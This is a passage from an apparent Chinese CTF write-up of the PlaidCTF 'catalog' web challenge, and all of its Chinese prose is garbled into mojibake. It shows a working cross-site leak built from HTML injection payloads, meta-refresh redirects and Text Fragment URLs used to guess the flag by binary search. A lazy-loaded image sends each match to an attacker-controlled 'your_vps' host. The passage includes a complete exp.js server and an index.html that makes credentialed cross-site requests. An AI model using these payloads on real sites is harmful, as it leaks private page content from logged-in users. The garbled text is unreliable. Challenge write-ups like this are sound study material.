‡ç­¾ï¼Œå³å¯æŠŠå†…å®¹æ‹†åˆ†ä¸ºå•ä¸ªå­—æ¯ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š\n \næ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨#:~:text=P-,C,T,-Fè¿›è¡Œé€‰ä¸­äº†ã€‚\nSpark Thinking é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­æˆ‘ä»¬æ˜¯å¦é€‰ä¸­äº†å‘¢ï¼Ÿ\nè¿™é‡Œ Exp ä½œè€…å¾ˆèªæ˜åœ°æƒ³åˆ°äº†ä¸€ä¸ªåŠæ³•ï¼š\n åˆ©ç”¨æˆ‘ä»¬åœ¨ information æ®µæåˆ°çš„åŒä¸€ session ä¼šå­˜å‚¨ä¸€å®šçš„ HTML å…ƒç´ ï¼Œæ‰€ä»¥å³ä½¿ç™»å½•çŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨ fetch no-cors æ¥æ›´æ–°ç•Œé¢ï¼Œåˆ©ç”¨ç™»å½•å¤±è´¥åœ¨å¦ä¸€ä¸ªåŒä¸€ session çš„ç•Œé¢å¾—åˆ°æ— è¿‡æ»¤çš„ HTML æ³¨å…¥ åˆ©ç”¨è¿™ä¸ªç™»å½•å¤±è´¥çš„ HTML æ³¨å…¥åˆ›é€ åˆ¤æ–­æ¡ä»¶ï¼šæ³¨å…¥è¶³å¤Ÿå¤šçš„\u0026lt;br\u0026gt;æ ‡ç­¾ï¼Œè®© FLAG ä½äºç”¨æˆ·è§†çª—é¡µé¢ä¹‹å¤–ï¼Œå¹¶åœ¨\u0026lt;br\u0026gt;çš„æœ€ååŠ å…¥ä¸€ä¸ªå›¾ç‰‡ï¼Œåˆ©ç”¨å›¾ç‰‡æ‡’åŠ è½½æ¥ç¡®å®š Text Fragments æ˜¯å¦åŒ¹é…åˆ°äº† FLAG ä¸€å¼€å§‹å› ä¸ºå›¾ç‰‡è¢«æ”¾ç½®åˆ°äº†ç”¨æˆ·è§†çª—ä¹‹å¤–å¹¶ä¸”ç”±äºå›¾ç‰‡æ‡’åŠ è½½ï¼Œå›¾ç‰‡å¹¶ä¸ä¼šè¯·æ±‚å¯¹åº”çš„èµ„æºï¼Œè¿™æ—¶å¦‚æœ#:~:text=P-,C,T,-FåŒ¹é…åˆ°äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ³¨å…¥çš„\u0026lt;br\u0026gt;æ ‡ç­¾çš„åŸå› ï¼Œé¡µé¢ä¼šå…ˆè¿›è¡Œæ»šåŠ¨åˆ° FLAG çš„ä½ç½®ï¼Œè¿™æ—¶å€™ï¼Œå›¾ç‰‡æ‰ä¼šåŠ è½½å¯¹åº”çš„èµ„æºï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡æ‡’åŠ è½½æ¥ç¡®å®šåŒ¹é…æˆåŠŸï¼›å¦‚æœåŒ¹é…ä¸æˆåŠŸçš„è¯ï¼Œå°±ä¸ä¼šè¯·æ±‚å¯¹åº”çš„èµ„æº æ‰€ä»¥è¿™æ—¶æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨è‡ªå·±çš„ vps ç›‘å¬ä¸€ä¸ªç«¯å£è®©æ‡’åŠ è½½çš„å›¾ç‰‡åœ¨è§¦å‘è¯·æ±‚æ—¶ï¼Œè¯·æ±‚æˆ‘ä»¬çš„ vps å°±å¯ä»¥åˆ¤æ–­æ˜¯å¦åŒ¹é…æˆåŠŸäº†  {% colorquote info %}\nNote:\n Support the â€˜loadingâ€™ attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on \u0026lt;iframe\u0026gt; and \u0026lt;img\u0026gt; elements.\n ä¹Ÿå°±æ˜¯è¯´åªæœ‰å½“ç”¨æˆ·çª—å£é¡µé¢å†…å…³æ³¨åˆ°\u0026lt;img\u0026gt;æ ‡ç­¾æ—¶ï¼Œè¯¥æ ‡ç­¾æ‰èƒ½åŠ è½½å¯¹åº”çš„èµ„æºã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨\u0026lt;img\u0026gt;åŸç”Ÿå±æ€§loading=lazyæ¥å®ç°ï¼ŒChrome 76ä»¥åçš„ç‰ˆæœ¬éƒ½å·²å®ç°äº†è¯¥åŠŸèƒ½â€”â€”Lazily load iframes and images via â€˜loadingâ€™ attribute\n{% endcolorquote %}\nè‡³æ­¤ï¼ŒåŸºæœ¬ä¸Šæ¯”è¾ƒå…³é”®çš„åœ°æ–¹æˆ‘ä»¬éƒ½è¯´å®Œäº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯å®ç°ä»¥åŠä¸€äº›ç»†èŠ‚çš„åœ°æ–¹äº†ã€‚\nuBlock \u0026amp; User Activation \u0026amp; Text Fragments è¿™æ—¶æˆ‘ä»¬å†æ¥å›å¤´çœ‹ uBlock \u0026amp; User Activation åœ¨æ•´ä¸ªè¿‡ç¨‹èµ·åˆ°äº†ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ\nå› ä¸º Chrome 80 å¼•å…¥äº† Text Fragments çš„æœºåˆ¶ï¼Œç»¼ä¸Šæˆ‘ä»¬çš„åˆ†æåˆ©ç”¨å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ–°çš„æ”»å‡»é¢ï¼Œç”¨è¿™ç§â€œä¾§ä¿¡é“â€çš„æ”»å‡»æ–¹å¼æˆ‘ä»¬å¯ä»¥çªƒå–ç”¨æˆ·éšç§ï¼Œæ‰€ä»¥å½“ç„¶å‡ºäºéšç§è€ƒè™‘ï¼Œ Google ä¹Ÿå¼•å…¥äº†ç›¸å¯¹çš„é™åˆ¶æœºåˆ¶ï¼š\n The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a \u0026ldquo;noopener\u0026rdquo; context, such that the destination page is known to be sufficiently isolated.\n æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å…¶ä¸­éå¸¸å…³é”®çš„ä¸€å¥è¯ï¼š **In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. **\nä¹Ÿå°±æ˜¯è¯´ Text Fragments åŠŸèƒ½ä»…åœ¨ç”±äº User Activation äº§ç”Ÿçš„å®Œæ•´å¯¼å‘ä¸Šæ‰èƒ½ç”Ÿæ•ˆï¼Œæ²¡æœ‰ User Activation æ˜¯æ— æ³•ä½¿ç”¨è¯¥åŠŸèƒ½çš„ï¼åœ¨å…¶ä»–åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ° Google å¯¹äº **User Activation ** åšäº†å¾ˆå¤šçš„å¼ºè°ƒï¼š\n The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.\n For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.\nå› æ­¤ï¼ŒåŸºäº User Activation å’Œæµè§ˆä¸Šä¸‹æ–‡éš”ç¦»çš„é™åˆ¶éå¸¸é‡è¦ï¼Œå¿…é¡»äºˆä»¥å®æ–½ã€‚\nè‡³äº Chrome å¦‚ä½•å®ç°é™åˆ¶è¯¥åŠŸèƒ½çš„ï¼Œå…·ä½“å¯ä»¥å‚è€ƒæ–‡æ¡£ Restricting the Text Fragment ï¼Œè¿™é‡Œå°±ä¸è¯¦è¿°äº†ã€‚\nä»ä»¥ä¸Šæ¥çœ‹ï¼Œå‡ºé¢˜äººçš„é¢˜å›¾å°±å¾ˆæ˜æ˜¾äº†ï¼š\n Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.\n å¹¶ä¸”æ ¹æ® User Activation v2 in Chrome ï¼š\n Full-overlay request from subframes: To grant a subframeâ€™s full-overlay request (sent through a postMessage), the main frame will check the subframeâ€™s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessageâ€™s event source parameter.\n ä¸¤è€…ç»“åˆåœ¨ä¸€èµ·å¯èƒ½å°±æ¯”è¾ƒå®¹æ˜“ç†è§£äº†ï¼Œä»¥ä¸‹æ˜¯ä¸ªäººæ ¹æ®æ–‡æ¡£ç†è§£ï¼Œå¹¶æ²¡æœ‰å‚è€ƒç ”ç©¶å…·ä½“ä»£ç å®ç°ï¼Œå¦‚æœæœ‰å¸ˆå‚…æ ¹æ®ä»£ç ç ”ç©¶å‡ºç»“æœä¸æˆ‘çš„ç†è§£æœ‰ä»€ä¹ˆå‡ºå…¥ï¼Œé‚£ä¸€å®šæ˜¯æˆ‘é”™äº†ï¼š\nä¸ªäººç†è§£ï¼šç®¡ç†å‘˜å•å‡»ä¸€ä¸ªæˆ‘ä»¬æäº¤æ‰“çš„é“¾æ¥ï¼Œå°†æ¶ˆè€—ä¸€ä¸ªç”¨æˆ·æ¿€æ´»æ‰“å¼€é“¾æ¥ï¼Œè€Œ uBlock å°† postMessage å‘é€åˆ°å…¶æ‰©å±• iframe ï¼Œä»è€Œå¤åˆ¶ç”¨æˆ·æ¿€æ´»ã€‚ æ¯å½“é¡µé¢åŠ è½½æ—¶ï¼Œå‰ç«¯éƒ½ä¼šä» uBlock æ¡†æ¶è·å– postMessage ï¼Œä»è€Œå†æ¬¡å°†æ¿€æ´»å¤åˆ¶å›å»ã€‚\næˆ‘ä»¬å¯ä»¥ä» Verification çœ‹åˆ°å…³äº uBlock ä¼ é€’ User Activation çš„éªŒè¯ã€‚\nRegex å› ä¸º FLAG æ­£åˆ™ä¸º /^PCTF\\{[A-Z0-9_]+\\}$/ï¼Œæˆ‘ä»¬æ¯æ¬¡ç”¨ Text Fragments åªèƒ½éªŒè¯ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ url ï¼Œä¸€æ¬¡å¯ä»¥åŒ¹é…å®Œå…¨éƒ¨çš„ç¬¦åˆæ­£åˆ™çš„å­—ç¬¦ï¼ŒA-Z0-9_ å¤–åŠ ä¸€ä¸ª } ä¸º FLAG é—­åˆçš„å­—ç¬¦\nhttp://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_ å¦‚æœåŒ¹é…äº†ï¼Œåˆ™å»æ‰ä¸€åŠçš„å­—ç¬¦ï¼Œé‡‡ç”¨äºŒåˆ†çš„å½¢å¼ç¼©å°æˆ‘ä»¬çš„åŒ¹é…èŒƒå›´ï¼Œæ‰€ä»¥ä¸‹ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥å‘é€çš„æ˜¯\nhttp://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I å¦‚æœåŒ¹é…äº†ï¼Œå°±ç»§ç»­åœ¨è¿™ä¸ªèŒƒå›´äºŒåˆ†ï¼Œä¸åŒ¹é…å°±ç”¨å¦ä¸€ä¸ªèŒƒå›´\nReproduce è¿™ä¸ªéƒ¨åˆ†å°±åªæ˜¯æä¾›å¤ç°çš„æ­¥éª¤ï¼Œä¸‹ä¸ªéƒ¨åˆ†æä¾›è¯¦ç»†çš„æ”»å‡»é“¾è§£é‡Šï¼š\n  æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œåˆ›å»ºä¸€ä¸ª issue ï¼Œå¹¶è®°å½•è¯¥ issue çš„æ•°å­— idï¼Œä¸ºäº†æ–¹ä¾¿è¾¨è¯†ï¼Œè¯¥æ•°å­— id æˆ‘ä»¬ç§°ä¸º issue_id_1 ï¼Œpost http åŒ…çš„ body å†…å®¹ä¸ºï¼š\nid=issue_id_1\u0026amp;title=3\u0026amp;content=1\u0026amp;image=z\u0026quot;/\u0026gt;\u0026lt;img src=\u0026quot;http://your_vps/fragment\u0026quot;\u0026gt;\u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot;+content=\u0026quot;0;URL='http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_'\u0026quot;\u0026gt;   å†åˆ›å»ºä¸€ä¸ª issue ï¼Œ å¹¶è®°å½•è¯¥ issue çš„æ•°å­— idï¼Œä¸ºäº†æ–¹ä¾¿è¾¨è¯†ï¼Œè¯¥æ•°å­— id æˆ‘ä»¬ç§°ä¸º issue_id_2ï¼Œpost http åŒ…çš„ body å†…å®¹ä¸ºï¼š\nid=issue_id_2\u0026amp;title=3\u0026amp;content=1\u0026amp;image=\u0026quot;\u0026gt;\u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026quot;0;URL='http://your_vps/'\u0026quot;\u0026gt;\u0026quot;   è‡ªå·±çš„ vps ä¸Šç”¨ node è¿è¡Œå¦‚ä¸‹ exp.js\nconst express = require(\u0026#34;express\u0026#34;); const app = express(); let status = false; let unlock = false; let match = false; app.get(\u0026#34;/status\u0026#34;, (req, res) =\u0026gt; { res.send(`${status}`); }); app.get(\u0026#34;/unlock\u0026#34;, (req, res) =\u0026gt; { unlock = true; res.send(\u0026#34;unlock\u0026#34;); }); app.get(\u0026#34;/firstload\u0026#34;, (req, res) =\u0026gt; { console.log(\u0026#34;==\u0026gt; Admin opened challenge\u0026#39;s page\u0026#34;); res.send(\u0026#34;firstload\u0026#34;); }); app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { console.log(\u0026#34;==\u0026gt; Admin was redirected to attacker\u0026#39;s page\u0026#34;); res.sendFile(\u0026#34;index.html\u0026#34;, { root: __dirname }); }); app.get(\u0026#34;/injection\u0026#34;, (req, res) =\u0026gt; { console.log(\u0026#34;==\u0026gt; HTML injection was inserted into id=3 catalog\u0026#34;); setTimeout(() =\u0026gt; { if (match) console.log(\u0026#34;==\u0026gt; There was a match\u0026#34;); else console.log(\u0026#34;==\u0026gt; There wasn\u0026#39;t a match\u0026#34;); match = false; unlock = false; status = false; }, 1000); res.send(\u0026#34;injection\u0026#34;); }); app.get(\u0026#34;/exfiltrated\u0026#34;, (req, res) =\u0026gt; { match = true; res.send(\u0026#34;exfiltrated\u0026#34;); }); app.get(\u0026#34;/fragment\u0026#34;, (req, res) =\u0026gt; { status = true; console.log(\u0026#34;==\u0026gt; Admin was fragmented\u0026#34;); let timer = setInterval(async () =\u0026gt; { if (unlock) { res.send(\u0026#34;fragment\u0026#34;); clearInterval(timer); } }, 1); }); app.listen(port); console.log(\u0026#34;Server running on port: \u0026#34; + port); index.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Psst! Get out of here...\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt; const next = async () =\u0026gt; { let res = await fetch(\u0026#34;/status\u0026#34;); let status = await res.text(); if (status === \u0026#34;true\u0026#34;) { await fetch(\u0026#34;http://catalog.pwni.ng/user.php\u0026#34;, { \u0026#34;headers\u0026#34;: { \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, }, \u0026#34;body\u0026#34;: `username=\u0026#34;/\u0026gt;\u0026lt;img src=\u0026#34;http://your_vps/injection\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;div align=\u0026#34;left\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;http://your_vps/exfiltrated\u0026#34; loading=\u0026#34;lazy\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;em\u0026gt;\u0026amp;password=1\u0026amp;action=login`, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;no-cors\u0026#34;, \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34; }); await fetch(\u0026#34;/unlock\u0026#34;); } else { next(); } } next(); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026#34;http://catalog.pwni.ng/issue.php?id=issue_id_1\u0026#34; style=\u0026#34;position: absolute; width: 400%; height: 500px; border: 0\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å…¶ä¸­your_vpså¤„æ›¿æ¢ä¸ºä½ çš„ vps åœ°å€ï¼Œissue_id_1 æ›¿æ¢ä¸ºä¹‹å‰çš„æ•°å­— id\n  éšä¾¿ report ä¸€ä¸ª issue ç»™ admin å¹¶æŠ“åŒ…ä¿®æ”¹å†…å®¹ï¼ŒæŠŠ id å­—æ®µæ”¹æˆ issue_id_2 å³å¯ã€‚\nid=19902\u0026amp;token=03AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PNyeSrcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g token æ˜¯ Google éªŒè¯ç ç”¨äºéªŒè¯çš„ token ï¼Œè¿™ä¸ª token ä½ å¯ä»¥å¦å¼€ä¸€ä¸ªé¢˜ç›®åœ°å€ï¼Œå¹¶æ‰“å¼€æ§åˆ¶å°è¾“å…¥ä»¥ä¸‹ä»£ç ï¼ˆè¿™æ®µä»£ç å¯ä»¥åœ¨é¢˜ç›® main.js æ‹¿åˆ°ï¼‰å³å¯ï¼š\ngrecaptcha.ready(async () =\u0026gt; { let token = await grecaptcha.execute(\u0026#34;6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y\u0026#34;, { action: \u0026#34;report\u0026#34; }); console.log(token); });   å¦‚æœ vps æ”¶åˆ°äº† match ï¼Œå°±åœ¨è¯¥èŒƒå›´ç»§ç»­äºŒåˆ†ï¼Œä¸ç„¶å°±åœ¨å¦ä¸€ä¸ªèŒƒå›´ç»§ç»­äºŒåˆ†ï¼Œé‡å¤1-4æ­¥éª¤å³å¯\n  Detailed Attack Chain å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å°±æ¥æ•´ç†ä¸€ä¸‹å…¨éƒ¨ä¿¡æ¯ï¼Œä»¥åŠè¯´ä¸€ä¸‹è¯¦ç»†çš„æ”»å‡»æµç¨‹ï¼š\n  é¦–å…ˆ admin ä¼šç‚¹å‡»æˆ‘ä»¬æäº¤çš„ç¬¬äºŒä¸ª issue ï¼Œç„¶åå› ä¸ºç¬¬äºŒä¸ª issue_2 å†…å®¹å­˜åœ¨\n\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;URL=\u0026#39;http://your_vps/\u0026#39;\u0026#34;\u0026gt;\u0026#34; ä¼šè·³è½¬åˆ°æˆ‘ä»¬ vps ä¸»é¡µé¢\n  è¿™æ—¶ admin ä¼šåŠ è½½ index.html ï¼Œæ­¤æ—¶ iframe ä¼šè¯·æ±‚ç¬¬ä¸€ä¸ª issue_1 é¡µé¢ï¼Œå¹¶ä¸”å‘é€è¯·æ±‚ http://your_vps/status ï¼Œæœ€åˆå§‹åŒ–çš„æ—¶å€™å› ä¸ºlet status = false;ï¼Œè€Œ js è¿˜æœ‰ä¸€ä¸ª status çš„åˆ¤æ–­\nlet status = await res.text(); if (status === \u0026#34;true\u0026#34;) { //... } æ‰€ä»¥ script é‡Œé¢çš„æµç¨‹ä¼šä¸€ç›´ç­‰å¾…statusçš„å˜åŒ–ï¼Œå®ç°äº†ä¸€ä¸ªç±»ä¼¼äºé”ä¸€æ ·çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ç§°ä¸º status é”ï¼Œè€Œè§£é”è¿™ä¸ªé”çš„æ¡ä»¶å°±æ˜¯å½“ iframe é‡Œé¢çš„ issue_1 å®Œå…¨åŠ è½½å®Œæ¯•ã€‚\nå½“ iframe ä¸­çš„ issue_1 å®Œå…¨åŠ è½½å®Œæ¯•ï¼Œæ­¤æ—¶ issue_1 ç•Œé¢é‡Œé¢è¿˜æœ‰ä¸€ä¸ª img æ ‡ç­¾ç”¨äºè§£é” status é”\n\u0026lt;img src=\u0026#34;http://your_vps/fragment\u0026#34;\u0026gt;\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34;+content=\u0026#34;0;URL=\u0026#39;http://catalog.pwni.ng/issue.php?id=3#...\u0026#34;\u0026gt; æ­¤æ—¶ä¼šè¯·æ±‚æˆ‘ä»¬ http://your_vps/fragment\napp.get(\u0026#34;/fragment\u0026#34;, (req, res) =\u0026gt; { status = true; console.log(\u0026#34;==\u0026gt; Admin was fragmented\u0026#34;); let timer = setInterval(async () =\u0026gt; { if (unlock) { res.send(\u0026#34;fragment\u0026#34;); clearInterval(timer); } }, 1); }); è¯¥è·¯ç”±è§£é”äº† status é”ï¼Œå¹¶åˆ›å»ºäº†ä¸€ä¸ªè®¡æ—¶å™¨ç­‰å¾… unlock æ¥è§£é™¤ï¼Œæˆ‘ä»¬ç§°ä¸º fragment é”ï¼Œè¡¨ç¤º admin å·²ç»åŠ è½½äº† iframe ã€‚\n  è¿™æ˜¯å› ä¸º fragment é”çš„åŸå› ï¼Œiframe å½“ä¸­çš„é¡µé¢ç­‰å¾…åœ¨ issue_1 ç•Œé¢ç­‰å¾… fragment é”çš„è§£é”ï¼Œè€Œå½“ status é”è§£é”ï¼Œä¼šç«‹é©¬è§¦å‘ index.html å½“ä¸­çš„ fetch è¯·æ±‚\nawait fetch(\u0026#34;http://catalog.pwni.ng/user.php\u0026#34;, { \u0026#34;headers\u0026#34;: { \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, }, \u0026#34;body\u0026#34;: `username=\u0026#34;/\u0026gt;\u0026lt;img src=\u0026#34;http://your_vps/injection\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026